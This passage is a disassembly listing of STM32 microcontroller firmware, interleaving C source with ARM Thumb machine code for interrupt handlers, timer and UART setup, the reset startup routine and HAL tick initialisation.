 8000dfa:	af00      	add	r7, sp, #0

  /* USER CODE END DebugMonitor_IRQn 0 */
  /* USER CODE BEGIN DebugMonitor_IRQn 1 */

  /* USER CODE END DebugMonitor_IRQn 1 */
}
 8000dfc:	bf00      	nop
 8000dfe:	46bd      	mov	sp, r7
 8000e00:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e04:	4770      	bx	lr

08000e06 <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 8000e06:	b480      	push	{r7}
 8000e08:	af00      	add	r7, sp, #0

  /* USER CODE END PendSV_IRQn 0 */
  /* USER CODE BEGIN PendSV_IRQn 1 */

  /* USER CODE END PendSV_IRQn 1 */
}
 8000e0a:	bf00      	nop
 8000e0c:	46bd      	mov	sp, r7
 8000e0e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e12:	4770      	bx	lr

08000e14 <SysTick_Handler>:

/**
  * @brief This function handles System tick timer.
  */
void SysTick_Handler(void)
{
 8000e14:	b580      	push	{r7, lr}
 8000e16:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 8000e18:	f000 f9b2 	bl	8001180 <HAL_IncTick>
  /* USER CODE BEGIN SysTick_IRQn 1 */

  /* USER CODE END SysTick_IRQn 1 */
}
 8000e1c:	bf00      	nop
 8000e1e:	bd80      	pop	{r7, pc}

08000e20 <TIM2_IRQHandler>:

/**
  * @brief This function handles TIM2 global interrupt.
  */
void TIM2_IRQHandler(void)
{
 8000e20:	b580      	push	{r7, lr}
 8000e22:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN TIM2_IRQn 0 */

  /* USER CODE END TIM2_IRQn 0 */
  HAL_TIM_IRQHandler(&htim2);
 8000e24:	4802      	ldr	r0, [pc, #8]	; (8000e30 <TIM2_IRQHandler+0x10>)
 8000e26:	f003 ffc1 	bl	8004dac <HAL_TIM_IRQHandler>
  /* USER CODE BEGIN TIM2_IRQn 1 */

  /* USER CODE END TIM2_IRQn 1 */
}
 8000e2a:	bf00      	nop
 8000e2c:	bd80      	pop	{r7, pc}
 8000e2e:	bf00      	nop
 8000e30:	200002e4 	.word	0x200002e4

08000e34 <USB_IRQHandler>:

/**
  * @brief This function handles USB event interrupt through EXTI line 17.
  */
void USB_IRQHandler(void)
{
 8000e34:	b580      	push	{r7, lr}
 8000e36:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_IRQn 0 */

  /* USER CODE END USB_IRQn 0 */
  HAL_PCD_IRQHandler(&hpcd_USB_FS);
 8000e38:	4802      	ldr	r0, [pc, #8]	; (8000e44 <USB_IRQHandler+0x10>)
 8000e3a:	f001 f819 	bl	8001e70 <HAL_PCD_IRQHandler>
  /* USER CODE BEGIN USB_IRQn 1 */

  /* USER CODE END USB_IRQn 1 */
}
 8000e3e:	bf00      	nop
 8000e40:	bd80      	pop	{r7, pc}
 8000e42:	bf00      	nop
 8000e44:	20000b7c 	.word	0x20000b7c

08000e48 <SystemInit>:
  * @brief  Setup the microcontroller system.
  * @retval None
  */

void SystemInit(void)
{
 8000e48:	b480      	push	{r7}
 8000e4a:	af00      	add	r7, sp, #0
  SCB->VTOR = VECT_TAB_BASE_ADDRESS | VECT_TAB_OFFSET;
#endif

  /* FPU settings ------------------------------------------------------------*/
#if (__FPU_PRESENT == 1) && (__FPU_USED == 1)
  SCB->CPACR |= ((3UL << 20U)|(3UL << 22U));  /* set CP10 and CP11 Full Access */
 8000e4c:	4b06      	ldr	r3, [pc, #24]	; (8000e68 <SystemInit+0x20>)
 8000e4e:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8000e52:	4a05      	ldr	r2, [pc, #20]	; (8000e68 <SystemInit+0x20>)
 8000e54:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 8000e58:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
#endif
}
 8000e5c:	bf00      	nop
 8000e5e:	46bd      	mov	sp, r7
 8000e60:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e64:	4770      	bx	lr
 8000e66:	bf00      	nop
 8000e68:	e000ed00 	.word	0xe000ed00

08000e6c <MX_TIM2_Init>:

TIM_HandleTypeDef htim2;

/* TIM2 init function */
void MX_TIM2_Init(void)
{
 8000e6c:	b580      	push	{r7, lr}
 8000e6e:	b088      	sub	sp, #32
 8000e70:	af00      	add	r7, sp, #0

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
 8000e72:	f107 0310 	add.w	r3, r7, #16
 8000e76:	2200      	movs	r2, #0
 8000e78:	601a      	str	r2, [r3, #0]
 8000e7a:	605a      	str	r2, [r3, #4]
 8000e7c:	609a      	str	r2, [r3, #8]
 8000e7e:	60da      	str	r2, [r3, #12]
  TIM_MasterConfigTypeDef sMasterConfig = {0};
 8000e80:	1d3b      	adds	r3, r7, #4
 8000e82:	2200      	movs	r2, #0
 8000e84:	601a      	str	r2, [r3, #0]
 8000e86:	605a      	str	r2, [r3, #4]
 8000e88:	609a      	str	r2, [r3, #8]

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
 8000e8a:	4b1e      	ldr	r3, [pc, #120]	; (8000f04 <MX_TIM2_Init+0x98>)
 8000e8c:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000e90:	601a      	str	r2, [r3, #0]
  htim2.Init.Prescaler = 7199;
 8000e92:	4b1c      	ldr	r3, [pc, #112]	; (8000f04 <MX_TIM2_Init+0x98>)
 8000e94:	f641 421f 	movw	r2, #7199	; 0x1c1f
 8000e98:	605a      	str	r2, [r3, #4]
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
 8000e9a:	4b1a      	ldr	r3, [pc, #104]	; (8000f04 <MX_TIM2_Init+0x98>)
 8000e9c:	2200      	movs	r2, #0
 8000e9e:	609a      	str	r2, [r3, #8]
  htim2.Init.Period = 399;
 8000ea0:	4b18      	ldr	r3, [pc, #96]	; (8000f04 <MX_TIM2_Init+0x98>)
 8000ea2:	f240 128f 	movw	r2, #399	; 0x18f
 8000ea6:	60da      	str	r2, [r3, #12]
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
 8000ea8:	4b16      	ldr	r3, [pc, #88]	; (8000f04 <MX_TIM2_Init+0x98>)
 8000eaa:	2200      	movs	r2, #0
 8000eac:	611a      	str	r2, [r3, #16]
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
 8000eae:	4b15      	ldr	r3, [pc, #84]	; (8000f04 <MX_TIM2_Init+0x98>)
 8000eb0:	2200      	movs	r2, #0
 8000eb2:	619a      	str	r2, [r3, #24]
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
 8000eb4:	4813      	ldr	r0, [pc, #76]	; (8000f04 <MX_TIM2_Init+0x98>)
 8000eb6:	f003 fece 	bl	8004c56 <HAL_TIM_Base_Init>
 8000eba:	4603      	mov	r3, r0
 8000ebc:	2b00      	cmp	r3, #0
 8000ebe:	d001      	beq.n	8000ec4 <MX_TIM2_Init+0x58>
  {
    Error_Handler();
 8000ec0:	f7ff feda 	bl	8000c78 <Error_Handler>
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
 8000ec4:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8000ec8:	613b      	str	r3, [r7, #16]
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
 8000eca:	f107 0310 	add.w	r3, r7, #16
 8000ece:	4619      	mov	r1, r3
 8000ed0:	480c      	ldr	r0, [pc, #48]	; (8000f04 <MX_TIM2_Init+0x98>)
 8000ed2:	f004 f86d 	bl	8004fb0 <HAL_TIM_ConfigClockSource>
 8000ed6:	4603      	mov	r3, r0
 8000ed8:	2b00      	cmp	r3, #0
 8000eda:	d001      	beq.n	8000ee0 <MX_TIM2_Init+0x74>
  {
    Error_Handler();
 8000edc:	f7ff fecc 	bl	8000c78 <Error_Handler>
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
 8000ee0:	2300      	movs	r3, #0
 8000ee2:	607b      	str	r3, [r7, #4]
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
 8000ee4:	2300      	movs	r3, #0
 8000ee6:	60fb      	str	r3, [r7, #12]
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
 8000ee8:	1d3b      	adds	r3, r7, #4
 8000eea:	4619      	mov	r1, r3
 8000eec:	4805      	ldr	r0, [pc, #20]	; (8000f04 <MX_TIM2_Init+0x98>)
 8000eee:	f004 fa4f 	bl	8005390 <HAL_TIMEx_MasterConfigSynchronization>
 8000ef2:	4603      	mov	r3, r0
 8000ef4:	2b00      	cmp	r3, #0
 8000ef6:	d001      	beq.n	8000efc <MX_TIM2_Init+0x90>
  {
    Error_Handler();
 8000ef8:	f7ff febe 	bl	8000c78 <Error_Handler>
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}
 8000efc:	bf00      	nop
 8000efe:	3720      	adds	r7, #32
 8000f00:	46bd      	mov	sp, r7
 8000f02:	bd80      	pop	{r7, pc}
 8000f04:	200002e4 	.word	0x200002e4

08000f08 <HAL_TIM_Base_MspInit>:

void HAL_TIM_Base_MspInit(TIM_HandleTypeDef* tim_baseHandle)
{
 8000f08:	b580      	push	{r7, lr}
 8000f0a:	b084      	sub	sp, #16
 8000f0c:	af00      	add	r7, sp, #0
 8000f0e:	6078      	str	r0, [r7, #4]

  if(tim_baseHandle->Instance==TIM2)
 8000f10:	687b      	ldr	r3, [r7, #4]
 8000f12:	681b      	ldr	r3, [r3, #0]
 8000f14:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8000f18:	d113      	bne.n	8000f42 <HAL_TIM_Base_MspInit+0x3a>
  {
  /* USER CODE BEGIN TIM2_MspInit 0 */

  /* USER CODE END TIM2_MspInit 0 */
    /* TIM2 clock enable */
    __HAL_RCC_TIM2_CLK_ENABLE();
 8000f1a:	4b0c      	ldr	r3, [pc, #48]	; (8000f4c <HAL_TIM_Base_MspInit+0x44>)
 8000f1c:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f1e:	4a0b      	ldr	r2, [pc, #44]	; (8000f4c <HAL_TIM_Base_MspInit+0x44>)
 8000f20:	f043 0301 	orr.w	r3, r3, #1
 8000f24:	6593      	str	r3, [r2, #88]	; 0x58
 8000f26:	4b09      	ldr	r3, [pc, #36]	; (8000f4c <HAL_TIM_Base_MspInit+0x44>)
 8000f28:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f2a:	f003 0301 	and.w	r3, r3, #1
 8000f2e:	60fb      	str	r3, [r7, #12]
 8000f30:	68fb      	ldr	r3, [r7, #12]

    /* TIM2 interrupt Init */
    HAL_NVIC_SetPriority(TIM2_IRQn, 0, 0);
 8000f32:	2200      	movs	r2, #0
 8000f34:	2100      	movs	r1, #0
 8000f36:	201c      	movs	r0, #28
 8000f38:	f000 fa41 	bl	80013be <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(TIM2_IRQn);
 8000f3c:	201c      	movs	r0, #28
 8000f3e:	f000 fa5a 	bl	80013f6 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN TIM2_MspInit 1 */

  /* USER CODE END TIM2_MspInit 1 */
  }
}
 8000f42:	bf00      	nop
 8000f44:	3710      	adds	r7, #16
 8000f46:	46bd      	mov	sp, r7
 8000f48:	bd80      	pop	{r7, pc}
 8000f4a:	bf00      	nop
 8000f4c:	40021000 	.word	0x40021000

08000f50 <MX_USART2_UART_Init>:
UART_HandleTypeDef huart2;

/* USART2 init function */

void MX_USART2_UART_Init(void)
{
 8000f50:	b580      	push	{r7, lr}
 8000f52:	af00      	add	r7, sp, #0
  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
 8000f54:	4b14      	ldr	r3, [pc, #80]	; (8000fa8 <MX_USART2_UART_Init+0x58>)
 8000f56:	4a15      	ldr	r2, [pc, #84]	; (8000fac <MX_USART2_UART_Init+0x5c>)
 8000f58:	601a      	str	r2, [r3, #0]
  huart2.Init.BaudRate = 115200;
 8000f5a:	4b13      	ldr	r3, [pc, #76]	; (8000fa8 <MX_USART2_UART_Init+0x58>)
 8000f5c:	f44f 32e1 	mov.w	r2, #115200	; 0x1c200
 8000f60:	605a      	str	r2, [r3, #4]
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
 8000f62:	4b11      	ldr	r3, [pc, #68]	; (8000fa8 <MX_USART2_UART_Init+0x58>)
 8000f64:	2200      	movs	r2, #0
 8000f66:	609a      	str	r2, [r3, #8]
  huart2.Init.StopBits = UART_STOPBITS_1;
 8000f68:	4b0f      	ldr	r3, [pc, #60]	; (8000fa8 <MX_USART2_UART_Init+0x58>)
 8000f6a:	2200      	movs	r2, #0
 8000f6c:	60da      	str	r2, [r3, #12]
  huart2.Init.Parity = UART_PARITY_NONE;
 8000f6e:	4b0e      	ldr	r3, [pc, #56]	; (8000fa8 <MX_USART2_UART_Init+0x58>)
 8000f70:	2200      	movs	r2, #0
 8000f72:	611a      	str	r2, [r3, #16]
  huart2.Init.Mode = UART_MODE_TX_RX;
 8000f74:	4b0c      	ldr	r3, [pc, #48]	; (8000fa8 <MX_USART2_UART_Init+0x58>)
 8000f76:	220c      	movs	r2, #12
 8000f78:	615a      	str	r2, [r3, #20]
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 8000f7a:	4b0b      	ldr	r3, [pc, #44]	; (8000fa8 <MX_USART2_UART_Init+0x58>)
 8000f7c:	2200      	movs	r2, #0
 8000f7e:	619a      	str	r2, [r3, #24]
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
 8000f80:	4b09      	ldr	r3, [pc, #36]	; (8000fa8 <MX_USART2_UART_Init+0x58>)
 8000f82:	2200      	movs	r2, #0
 8000f84:	61da      	str	r2, [r3, #28]
  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
 8000f86:	4b08      	ldr	r3, [pc, #32]	; (8000fa8 <MX_USART2_UART_Init+0x58>)
 8000f88:	2200      	movs	r2, #0
 8000f8a:	621a      	str	r2, [r3, #32]
  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
 8000f8c:	4b06      	ldr	r3, [pc, #24]	; (8000fa8 <MX_USART2_UART_Init+0x58>)
 8000f8e:	2200      	movs	r2, #0
 8000f90:	625a      	str	r2, [r3, #36]	; 0x24
  if (HAL_UART_Init(&huart2) != HAL_OK)
 8000f92:	4805      	ldr	r0, [pc, #20]	; (8000fa8 <MX_USART2_UART_Init+0x58>)
 8000f94:	f004 fa80 	bl	8005498 <HAL_UART_Init>
 8000f98:	4603      	mov	r3, r0
 8000f9a:	2b00      	cmp	r3, #0
 8000f9c:	d001      	beq.n	8000fa2 <MX_USART2_UART_Init+0x52>
  {
    Error_Handler();
 8000f9e:	f7ff fe6b 	bl	8000c78 <Error_Handler>
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}
 8000fa2:	bf00      	nop
 8000fa4:	bd80      	pop	{r7, pc}
 8000fa6:	bf00      	nop
 8000fa8:	20000330 	.word	0x20000330
 8000fac:	40004400 	.word	0x40004400

08000fb0 <HAL_UART_MspInit>:

void HAL_UART_MspInit(UART_HandleTypeDef* uartHandle)
{
 8000fb0:	b580      	push	{r7, lr}
 8000fb2:	b09e      	sub	sp, #120	; 0x78
 8000fb4:	af00      	add	r7, sp, #0
 8000fb6:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000fb8:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8000fbc:	2200      	movs	r2, #0
 8000fbe:	601a      	str	r2, [r3, #0]
 8000fc0:	605a      	str	r2, [r3, #4]
 8000fc2:	609a      	str	r2, [r3, #8]
 8000fc4:	60da      	str	r2, [r3, #12]
 8000fc6:	611a      	str	r2, [r3, #16]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 8000fc8:	f107 0310 	add.w	r3, r7, #16
 8000fcc:	2254      	movs	r2, #84	; 0x54
 8000fce:	2100      	movs	r1, #0
 8000fd0:	4618      	mov	r0, r3
 8000fd2:	f00b ffff 	bl	800cfd4 <memset>
  if(uartHandle->Instance==USART2)
 8000fd6:	687b      	ldr	r3, [r7, #4]
 8000fd8:	681b      	ldr	r3, [r3, #0]
 8000fda:	4a28      	ldr	r2, [pc, #160]	; (800107c <HAL_UART_MspInit+0xcc>)
 8000fdc:	4293      	cmp	r3, r2
 8000fde:	d148      	bne.n	8001072 <HAL_UART_MspInit+0xc2>

  /* USER CODE END USART2_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART2;
 8000fe0:	2302      	movs	r3, #2
 8000fe2:	613b      	str	r3, [r7, #16]
    PeriphClkInit.Usart2ClockSelection = RCC_USART2CLKSOURCE_PCLK1;
 8000fe4:	2300      	movs	r3, #0
 8000fe6:	637b      	str	r3, [r7, #52]	; 0x34
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 8000fe8:	f107 0310 	add.w	r3, r7, #16
 8000fec:	4618      	mov	r0, r3
 8000fee:	f003 fa97 	bl	8004520 <HAL_RCCEx_PeriphCLKConfig>
 8000ff2:	4603      	mov	r3, r0
 8000ff4:	2b00      	cmp	r3, #0
 8000ff6:	d001      	beq.n	8000ffc <HAL_UART_MspInit+0x4c>
    {
      Error_Handler();
 8000ff8:	f7ff fe3e 	bl	8000c78 <Error_Handler>
    }

    /* USART2 clock enable */
    __HAL_RCC_USART2_CLK_ENABLE();
 8000ffc:	4b20      	ldr	r3, [pc, #128]	; (8001080 <HAL_UART_MspInit+0xd0>)
 8000ffe:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001000:	4a1f      	ldr	r2, [pc, #124]	; (8001080 <HAL_UART_MspInit+0xd0>)
 8001002:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001006:	6593      	str	r3, [r2, #88]	; 0x58
 8001008:	4b1d      	ldr	r3, [pc, #116]	; (8001080 <HAL_UART_MspInit+0xd0>)
 800100a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800100c:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001010:	60fb      	str	r3, [r7, #12]
 8001012:	68fb      	ldr	r3, [r7, #12]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8001014:	4b1a      	ldr	r3, [pc, #104]	; (8001080 <HAL_UART_MspInit+0xd0>)
 8001016:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8001018:	4a19      	ldr	r2, [pc, #100]	; (8001080 <HAL_UART_MspInit+0xd0>)
 800101a:	f043 0301 	orr.w	r3, r3, #1
 800101e:	64d3      	str	r3, [r2, #76]	; 0x4c
 8001020:	4b17      	ldr	r3, [pc, #92]	; (8001080 <HAL_UART_MspInit+0xd0>)
 8001022:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8001024:	f003 0301 	and.w	r3, r3, #1
 8001028:	60bb      	str	r3, [r7, #8]
 800102a:	68bb      	ldr	r3, [r7, #8]
    /**USART2 GPIO Configuration
    PA2     ------> USART2_TX
    PA15 (JTDI)     ------> USART2_RX
    */
    GPIO_InitStruct.Pin = VCP_TX_Pin;
 800102c:	2304      	movs	r3, #4
 800102e:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001030:	2302      	movs	r3, #2
 8001032:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8001034:	2300      	movs	r3, #0
 8001036:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8001038:	2303      	movs	r3, #3
 800103a:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF7_USART2;
 800103c:	2307      	movs	r3, #7
 800103e:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_TX_GPIO_Port, &GPIO_InitStruct);
 8001040:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001044:	4619      	mov	r1, r3
 8001046:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 800104a:	f000 fc67 	bl	800191c <HAL_GPIO_Init>

    GPIO_InitStruct.Pin = VCP_RX_Pin;
 800104e:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8001052:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001054:	2302      	movs	r3, #2
 8001056:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8001058:	2300      	movs	r3, #0
 800105a:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 800105c:	2303      	movs	r3, #3
 800105e:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF3_USART2;
 8001060:	2303      	movs	r3, #3
 8001062:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_RX_GPIO_Port, &GPIO_InitStruct);
 8001064:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001068:	4619      	mov	r1, r3
 800106a:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 800106e:	f000 fc55 	bl	800191c <HAL_GPIO_Init>

  /* USER CODE BEGIN USART2_MspInit 1 */

  /* USER CODE END USART2_MspInit 1 */
  }
}
 8001072:	bf00      	nop
 8001074:	3778      	adds	r7, #120	; 0x78
 8001076:	46bd      	mov	sp, r7
 8001078:	bd80      	pop	{r7, pc}
 800107a:	bf00      	nop
 800107c:	40004400 	.word	0x40004400
 8001080:	40021000 	.word	0x40021000

08001084 <Reset_Handler>:

    .section	.text.Reset_Handler
	.weak	Reset_Handler
	.type	Reset_Handler, %function
Reset_Handler:
  ldr   sp, =_estack    /* Set stack pointer */
 8001084:	f8df d034 	ldr.w	sp, [pc, #52]	; 80010bc <LoopForever+0x2>

/* Call the clock system initialization function.*/
    bl  SystemInit
 8001088:	f7ff fede 	bl	8000e48 <SystemInit>

/* Copy the data segment initializers from flash to SRAM */
  ldr r0, =_sdata
 800108c:	480c      	ldr	r0, [pc, #48]	; (80010c0 <LoopForever+0x6>)
  ldr r1, =_edata
 800108e:	490d      	ldr	r1, [pc, #52]	; (80010c4 <LoopForever+0xa>)
  ldr r2, =_sidata
 8001090:	4a0d      	ldr	r2, [pc, #52]	; (80010c8 <LoopForever+0xe>)
  movs r3, #0
 8001092:	2300      	movs	r3, #0
  b LoopCopyDataInit
 8001094:	e002      	b.n	800109c <LoopCopyDataInit>

08001096 <CopyDataInit>:

CopyDataInit:
  ldr r4, [r2, r3]
 8001096:	58d4      	ldr	r4, [r2, r3]
  str r4, [r0, r3]
 8001098:	50c4      	str	r4, [r0, r3]
  adds r3, r3, #4
 800109a:	3304      	adds	r3, #4

0800109c <LoopCopyDataInit>:

LoopCopyDataInit:
  adds r4, r0, r3
 800109c:	18c4      	adds	r4, r0, r3
  cmp r4, r1
 800109e:	428c      	cmp	r4, r1
  bcc CopyDataInit
 80010a0:	d3f9      	bcc.n	8001096 <CopyDataInit>
  
/* Zero fill the bss segment. */
  ldr r2, =_sbss
 80010a2:	4a0a      	ldr	r2, [pc, #40]	; (80010cc <LoopForever+0x12>)
  ldr r4, =_ebss
 80010a4:	4c0a      	ldr	r4, [pc, #40]	; (80010d0 <LoopForever+0x16>)
  movs r3, #0
 80010a6:	2300      	movs	r3, #0
  b LoopFillZerobss
 80010a8:	e001      	b.n	80010ae <LoopFillZerobss>

080010aa <FillZerobss>:

FillZerobss:
  str  r3, [r2]
 80010aa:	6013      	str	r3, [r2, #0]
  adds r2, r2, #4
 80010ac:	3204      	adds	r2, #4

080010ae <LoopFillZerobss>:

LoopFillZerobss:
  cmp r2, r4
 80010ae:	42a2      	cmp	r2, r4
  bcc FillZerobss
 80010b0:	d3fb      	bcc.n	80010aa <FillZerobss>

/* Call static constructors */
    bl __libc_init_array
 80010b2:	f00b ff97 	bl	800cfe4 <__libc_init_array>
/* Call the application's entry point.*/
	bl	main
 80010b6:	f7ff fa67 	bl	8000588 <main>

080010ba <LoopForever>:

LoopForever:
    b LoopForever
 80010ba:	e7fe      	b.n	80010ba <LoopForever>
  ldr   sp, =_estack    /* Set stack pointer */
 80010bc:	20010000 	.word	0x20010000
  ldr r0, =_sdata
 80010c0:	20000000 	.word	0x20000000
  ldr r1, =_edata
 80010c4:	20000240 	.word	0x20000240
  ldr r2, =_sidata
 80010c8:	0800d214 	.word	0x0800d214
  ldr r2, =_sbss
 80010cc:	20000240 	.word	0x20000240
  ldr r4, =_ebss
 80010d0:	20001f14 	.word	0x20001f14

080010d4 <ADC1_IRQHandler>:
 * @retval : None
*/
    .section	.text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
	b	Infinite_Loop
 80010d4:	e7fe      	b.n	80010d4 <ADC1_IRQHandler>

080010d6 <HAL_Init>:
  *         each 1ms in the SysTick_Handler() interrupt handler.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_Init(void)
{
 80010d6:	b580      	push	{r7, lr}
 80010d8:	b082      	sub	sp, #8
 80010da:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef  status = HAL_OK;
 80010dc:	2300      	movs	r3, #0
 80010de:	71fb      	strb	r3, [r7, #7]
#if (PREFETCH_ENABLE != 0)
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
#endif /* PREFETCH_ENABLE */

  /* Set Interrupt Group Priority */
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 80010e0:	2003      	movs	r0, #3
 80010e2:	f000 f961 	bl	80013a8 <HAL_NVIC_SetPriorityGrouping>

  /* Use SysTick as time base source and configure 1ms tick (default clock after Reset is MSI) */
  if (HAL_InitTick(TICK_INT_PRIORITY) != HAL_OK)
 80010e6:	2000      	movs	r0, #0
 80010e8:	f000 f80e 	bl	8001108 <HAL_InitTick>
 80010ec:	4603      	mov	r3, r0
 80010ee:	2b00      	cmp	r3, #0
 80010f0:	d002      	beq.n	80010f8 <HAL_Init+0x22>
  {
    status = HAL_ERROR;
 80010f2:	2301      	movs	r3, #1
 80010f4:	71fb      	strb	r3, [r7, #7]
 80010f6:	e001      	b.n	80010fc <HAL_Init+0x26>
  }
  else
  {
    /* Init the low level hardware */
    HAL_MspInit();
 80010f8:	f7ff fe44 	bl	8000d84 <HAL_MspInit>
  }

  /* Return function status */
  return status;
 80010fc:	79fb      	ldrb	r3, [r7, #7]
}
 80010fe:	4618      	mov	r0, r3
 8001100:	3708      	adds	r7, #8
 8001102:	46bd      	mov	sp, r7
 8001104:	bd80      	pop	{r7, pc}
	...

08001108 <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority  Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 8001108:	b580      	push	{r7, lr}
 800110a:	b084      	sub	sp, #16
 800110c:	af00      	add	r7, sp, #0
 800110e:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef  status = HAL_OK;
 8001110:	2300      	movs	r3, #0
 8001112:	73fb      	strb	r3, [r7, #15]

  /* Check uwTickFreq for MisraC 2012 (even if uwTickFreq is a enum type that doesn't take the value zero)*/
  if ((uint32_t)uwTickFreq != 0U)
 8001114:	4b17      	ldr	r3, [pc, #92]	; (8001174 <HAL_InitTick+0x6c>)
 8001116:	781b      	ldrb	r3, [r3, #0]
 8001118:	2b00      	cmp	r3, #0
 800111a:	d023      	beq.n	8001164 <HAL_InitTick+0x5c>
  {
    /*Configure the SysTick to have interrupt in 1ms time basis*/
    if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / (uint32_t)uwTickFreq)) == 0U)
 800111c:	4b16      	ldr	r3, [pc, #88]	; (8001178 <HAL_InitTick+0x70>)
 800111e:	681a      	ldr	r2, [r3, #0]
 8001120:	4b14      	ldr	r3, [pc, #80]	; (8001174 <HAL_InitTick+0x6c>)
 8001122:	781b      	ldrb	r3, [r3, #0]
 8001124:	4619      	mov	r1, r3
 8001126:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 800112a:	fbb3 f3f1 	udiv	r3, r3, r1
 800112e:	fbb2 f3f3 	udiv	r3, r2, r3
 8001132:	4618      	mov	r0, r3
 8001134:	f000 f96d 	bl	8001412 <HAL_SYSTICK_Config>
 8001138:	4603      	mov	r3, r0
 800113a:	2b00      	cmp	r3, #0
 800113c:	d10f      	bne.n	800115e <HAL_InitTick+0x56>
    {
      /* Configure the SysTick IRQ priority */
      if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 800113e:	687b      	ldr	r3, [r7, #4]
 8001140:	2b0f      	cmp	r3, #15
 8001142:	d809      	bhi.n	8001158 <HAL_InitTick+0x50>
      {
        HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 8001144:	2200      	movs	r2, #0
 8001146:	6879      	ldr	r1, [r7, #4]
 8001148:	f04f 30ff 	mov.w	r0, #4294967295
